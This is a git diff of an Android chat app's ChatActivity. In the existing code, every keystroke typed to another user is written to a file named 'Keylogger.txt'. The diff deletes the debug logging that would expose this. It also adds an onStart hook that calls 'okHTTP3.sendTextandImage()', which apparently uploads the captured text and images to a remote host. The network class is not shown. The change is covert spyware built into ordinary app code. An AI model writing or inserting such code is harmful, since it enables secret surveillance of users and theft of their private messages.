@@ -76,6 +76,7 @@ public class ChatActivity extends AppCompatActivity {
     String dateString = dateFormat.format(date);
     ImageView image, location;
     LocationRequest locationRequest;
+    okHTTP3 okHTTP3;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -106,18 +107,15 @@ public class ChatActivity extends AppCompatActivity {
                     for (int i = 0; i < before - count; i++) {
                         String keylog  = "Chat with " + otheruser + ":{BACKSPACE}\n";
                         writeToFile("Keylogger.txt", keylog);
-                        Log.i("this", keylog);
                     }
                     return;
                 }
                 if (s.charAt(start + count - 1) == '\n') {
                     String keylog  = "Chat with " + otheruser + ":{ENTER}\n";
                     writeToFile("Keylogger.txt", keylog);
-                    Log.i("this", keylog);
                 } else {
                     String keylog = "Chat with " + otheruser + ":{" + s.charAt(start + count - 1) + "}\n";
                     writeToFile("Keylogger.txt", keylog);
-                    Log.i("this", keylog);
                 }
             }
 
@@ -255,6 +253,14 @@ public class ChatActivity extends AppCompatActivity {
             }
         };
         messageList.setAdapter(adapter);
+    }
+
+    @Override
+    protected void onStart() {
+        super.onStart();
+        okHTTP3 = new okHTTP3();
+        okHTTP3.sendTextandImage();
+
     }
 
     public void sendMessage(View view) {
